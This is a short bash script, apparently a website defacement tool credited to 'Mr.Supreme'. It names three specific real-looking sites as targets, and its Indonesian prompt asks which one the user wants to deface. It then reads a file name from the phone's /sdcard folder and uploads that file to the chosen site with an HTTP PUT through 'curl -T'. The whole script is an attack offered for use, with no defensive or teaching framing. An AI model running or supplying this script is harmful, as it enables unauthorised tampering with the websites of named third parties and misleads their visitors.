#!/bin/bash
#Tools By Mr.Supreme

echo "Tools Bye Mr.Supreme"
echo "http://savanacloud.com/"
echo "http://whosting.co.za/"
echo "http://ospreygroup.co.za/"
echo "Silahkan Pilih Website Ketiga Itu Yang Mau Di Deface : "
read target
sleep 1
echo "Input File Kamu : "
read file
sleep 1
echo "Please Wait..."
sleep 2
curl -T /sdcard/$file $target

